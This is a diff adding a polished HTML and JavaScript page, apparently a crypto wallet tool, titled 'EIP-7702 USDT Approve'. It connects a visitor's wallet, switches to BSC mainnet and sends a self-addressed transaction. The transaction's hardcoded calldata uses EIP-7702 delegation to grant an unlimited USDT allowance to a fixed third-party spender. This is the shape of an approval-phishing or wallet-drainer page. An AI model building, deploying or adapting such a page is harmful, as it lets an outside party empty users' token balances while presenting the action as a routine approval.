@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>EIP-7702 USDT Approve</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Syne:wght@700;800&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:        #0a0e17;
+    --surface:   #111827;
+    --border:    #1f2d4d;
+    --text:      #c8d3e8;
+    --text-dim:  #5a6a8a;
+    --accent:    #00e5a0;
+    --accent2:   #00c8ff;
+    --danger:    #ff4d6a;
+    --mono:      'IBM Plex Mono', monospace;
+    --display:   'Syne', sans-serif;
+  }
+
+  body {
+    font-family: var(--mono);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    overflow-x: hidden;
+  }
+
+  /* ── background grid ── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 48px 48px;
+    opacity: 0.18;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative; z-index: 1;
+    width: 100%; max-width: 560px;
+  }
+
+  /* ── header ── */
+  .header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+  .header .badge {
+    display: inline-block;
+    font-size: 11px;
+    letter-spacing: 2.5px;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    border-radius: 20px;
+    padding: 4px 14px;
+    margin-bottom: 16px;
+  }
+  .header h1 {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: -0.5px;
+  }
+  .header p {
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-top: 6px;
+  }
+
+  /* ── card ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px;
+    margin-bottom: 16px;
+  }
+  .card-title {
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── info rows ── */
+  .info-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 10px 0;
+    border-bottom: 1px solid var(--border);
+    gap: 12px;
+  }
+  .info-row:last-child { border-bottom: none; }
+  .info-label {
+    font-size: 11px;
+    color: var(--text-dim);
+    white-space: nowrap;
+    padding-top: 2px;
+  }
+  .info-value {
+    font-size: 12px;
+    color: var(--text);
+    text-align: right;
+    word-break: break-all;
+    line-height: 1.5;
+  }
+  .info-value .tag {
+    display: inline-block;
+    font-size: 10px;
+    background: rgba(0,229,160,0.1);
+    color: var(--accent);
+    border-radius: 4px;
+    padding: 2px 7px;
+    margin-left: 6px;
+    vertical-align: middle;
+  }
+
+  /* ── data block ── */
+  .data-block {
+    background: rgba(0,0,0,0.35);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 14px;
+    margin-top: 10px;
+    position: relative;
+  }
+  .data-block pre {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent2);
+    word-break: break-all;
+    white-space: pre-wrap;
+    line-height: 1.7;
+  }
+  .copy-btn {
+    position: absolute;
+    top: 10px; right: 10px;
+    background: var(--border);
+    border: none;
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 9px;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background 0.2s, color 0.2s;
+  }
+  .copy-btn:hover { background: var(--accent); color: #000; }
+
+  /* ── status banner ── */
+  .status {
+    display: none;
+    align-items: center;
+    gap: 10px;
+    padding: 12px 16px;
+    border-radius: 10px;
+    font-size: 12px;
+    margin-bottom: 16px;
+  }
+  .status.show { display: flex; }
+  .status.info    { background: rgba(0,200,255,0.08); border: 1px solid rgba(0,200,255,0.25); color: var(--accent2); }
+  .status.success { background: rgba(0,229,160,0.08); border: 1px solid rgba(0,229,160,0.25); color: var(--accent); }
+  .status.error   { background: rgba(255,77,106,0.08); border: 1px solid rgba(255,77,106,0.25); color: var(--danger); }
+  .status .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .status.info .dot    { background: var(--accent2); box-shadow: 0 0 6px var(--accent2); }
+  .status.success .dot { background: var(--accent);  box-shadow: 0 0 6px var(--accent); }
+  .status.error .dot   { background: var(--danger);  box-shadow: 0 0 6px var(--danger); }
+
+  /* ── button ── */
+  .btn {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn-connect {
+    background: transparent;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+  }
+  .btn-connect:hover { background: rgba(0,229,160,0.08); }
+
+  .btn-execute {
+    background: linear-gradient(135deg, var(--accent), #00b386);
+    color: #0a0e17;
+    display: none;
+  }
+  .btn-execute.show { display: block; }
+  .btn-execute:hover { filter: brightness(1.1); }
+  .btn-execute:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+    filter: none;
+  }
+
+  /* ── tx link ── */
+  .tx-link {
+    display: none;
+    margin-top: 12px;
+    text-align: center;
+    font-size: 11px;
+  }
+  .tx-link.show { display: block; }
+  .tx-link a {
+    color: var(--accent2);
+    text-decoration: none;
+    border-bottom: 1px solid var(--accent2);
+  }
+  .tx-link a:hover { opacity: 0.7; }
+
+  /* ── spinner ── */
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner {
+    display: inline-block;
+    width: 14px; height: 14px;
+    border: 2px solid rgba(10,14,23,0.3);
+    border-top-color: #0a0e17;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    vertical-align: middle;
+    margin-right: 6px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="badge">EIP-7702</div>
+    <h1>USDT Approve</h1>
+    <p>通过 EIP-7702 授权 USDT 给 Spender</p>
+  </div>
+
+  <!-- Status -->
+  <div class="status" id="status">
+    <div class="dot"></div>
+    <span id="statusText"></span>
+  </div>
+
+  <!-- Transaction Details -->
+  <div class="card">
+    <div class="card-title">Transaction Details</div>
+    <div class="info-row">
+      <span class="info-label">From / To</span>
+      <span class="info-value" id="fromAddr">未连接钱包</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Chain</span>
+      <span class="info-value">BSC Mainnet <span class="tag">56</span></span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Value</span>
+      <span class="info-value">0 BNB</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Action</span>
+      <span class="info-value">USDT.approve(spender, MAX) <span class="tag">EIP-7702</span></span>
+    </div>
+  </div>
+
+  <!-- Approve Details -->
+  <div class="card">
+    <div class="card-title">Approve Details</div>
+    <div class="info-row">
+      <span class="info-label">Token</span>
+      <span class="info-value">0x55d398326f99059ff775485246999027b3197955</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Spender</span>
+      <span class="info-value">0x07906CbD61B09c7C22e06d49ABEF8FE1811007C0</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Amount</span>
+      <span class="info-value">Unlimited (type(uint256).max)</span>
+    </div>
+  </div>
+
+  <!-- Calldata -->
+  <div class="card">
+    <div class="card-title">Calldata</div>
+    <div class="data-block">
+      <button class="copy-btn" onclick="copyData()">COPY</button>
+      <pre id="calldataPre">0x34fcd5be
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000020
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000001
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000020
+00000000000000000000000055d398326f99059f
+f775485246999027b3197955000000000000000000
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000060
+0000000000000000000000000000000000000000
+0000000000000000000000000000000000000044
+095ea7b30000000000000000000000000790
+6cbd61b09c7c22e06d49abef8fe1811007c0ffff
+fffffffffffffffffffffffffffffffffffffff
+ffffffff00000000000000000000000000000000
+000000000000000000000000000000</pre>
+    </div>
+  </div>
+
+  <!-- Buttons -->
+  <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">
+    连接钱包
+  </button>
+  <button class="btn btn-execute" id="executeBtn" onclick="executeTx()" disabled>
+    发送交易
+  </button>
+
+  <!-- TX hash link -->
+  <div class="tx-link" id="txLink">
+    <a id="txLinkA" href="#" target="_blank" rel="noopener">查看交易详情 →</a>
+  </div>
+</div>
+
+<script>
+// ── Calldata (完整，不带换行) ──────────────────────────────────────────────
+const CALLDATA =
+  '0x34fcd5be' +
+  '0000000000000000000000000000000000000000000000000000000000000020' +
+  '0000000000000000000000000000000000000000000000000000000000000001' +
+  '0000000000000000000000000000000000000000000000000000000000000020' +
+  '00000000000000000000000055d398326f99059ff775485246999027b3197955' +
+  '0000000000000000000000000000000000000000000000000000000000000000' +
+  '0000000000000000000000000000000000000000000000000000000000000060' +
+  '0000000000000000000000000000000000000000000000000000000000000044' +
+  '095ea7b3' +
+  '00000000000000000000000007906cbd61b09c7c22e06d49abef8fe1811007c0' +
+  'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' +
+  '00000000000000000000000000000000000000000000000000000000';
+
+const BSC_CHAIN_ID = '0x38'; // 56
+
+let account = null;
+
+// ── UI helpers ────────────────────────────────────────────────────────────
+function showStatus(type, msg) {
+  const el = document.getElementById('status');
+  el.className = 'status ' + type + ' show';
+  document.getElementById('statusText').textContent = msg;
+}
+function hideStatus() {
+  document.getElementById('status').className = 'status';
+}
+
+// ── Connect wallet ────────────────────────────────────────────────────────
+async function connectWallet() {
+  if (!window.ethereum) {
+    showStatus('error', '未检测到钱包插件，请安装 MetaMask 或 Trust Wallet');
+    return;
+  }
+
+  try {
+    // 请求连接
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    account = accounts[0];
+
+    // 检查链 ID，如果不是 BSC 则切换
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (chainId !== BSC_CHAIN_ID) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: BSC_CHAIN_ID }]
+        });
+      } catch (e) {
+        // 如果链不存在则添加
+        if (e.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: BSC_CHAIN_ID,
+              chainName: 'Binance Smart Chain Mainnet',
+              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
+        } else {
+          throw e;
+        }
+      }
+    }
+
+    // 更新 UI
+    document.getElementById('fromAddr').textContent = account;
+    document.getElementById('connectBtn').style.display = 'none';
+    document.getElementById('executeBtn').classList.add('show');
+    document.getElementById('executeBtn').disabled = false;
+    showStatus('success', '钱包已连接：' + account.slice(0,6) + '...' + account.slice(-4));
+
+    // 监听账户切换
+    window.ethereum.on('accountsChanged', (accs) => {
+      if (!accs.length) location.reload();
+    });
+
+  } catch (e) {
+    showStatus('error', '连接失败：' + (e.message || e));
+  }
+}
+
+// ── Execute transaction ──────────────────────────────────────────────────
+async function executeTx() {
+  const btn = document.getElementById('executeBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>发送中...';
+  hideStatus();
+
+  try {
+    const txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from:  account,
+        to:    account,        // 给自己转账（EIP-7702 要求 from === to）
+        value: '0x0',          // 0 BNB
+        data:  CALLDATA
+      }]
+    });
+
+    // 成功
+    btn.innerHTML = '已发送 ✓';
+    showStatus('success', '交易已发送，等待确认...');
+
+    // 显示 BSC 浏览器链接
+    const link = document.getElementById('txLinkA');
+    link.href = 'https://bscscan.com/tx/' + txHash;
+    document.getElementById('txLink').classList.add('show');
+
+  } catch (e) {
+    btn.disabled = false;
+    btn.innerHTML = '发送交易';
+    if (e.code === 4001) {
+      showStatus('info', '交易已被用户取消');
+    } else {
+      showStatus('error', '发送失败：' + (e.message || e));
+    }
+  }
+}
+
+// ── Copy calldata ────────────────────────────────────────────────────────
+function copyData() {
+  navigator.clipboard.writeText(CALLDATA).then(() => {
+    const btn = document.querySelector('.copy-btn');
+    btn.textContent = 'COPIED';
+    setTimeout(() => btn.textContent = 'COPY', 1200);
+  });
+}
+</script>
+</body>
+</html>
